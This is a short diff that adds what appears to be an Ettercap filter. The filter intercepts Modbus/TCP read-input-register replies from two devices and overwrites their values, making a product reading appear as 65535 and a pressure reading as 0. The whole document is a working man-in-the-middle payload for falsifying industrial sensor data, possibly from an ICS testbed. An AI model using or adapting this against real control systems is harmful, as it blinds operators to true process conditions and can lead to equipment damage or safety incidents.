@@ -1,0 +1,15 @@
+# manipulate product reading to 65535 and pressure reading to 0
+
+if (ip.src == '192.168.95.13' && ip.dst == '192.168.95.2') {
+    if (tcp.src == 502 && DATA.data + 7 == 0x04) {
+        DATA.data + 11 = 0xff;
+        DATA.data + 12 = 0xff;
+    }
+}
+
+if (ip.src == '192.168.95.14' && ip.dst == '192.168.95.2') {
+    if (tcp.src == 502 && DATA.data + 7 == 0x04) {
+        DATA.data + 9 = 0x00;
+        DATA.data + 10 = 0x00;
+    }
+}
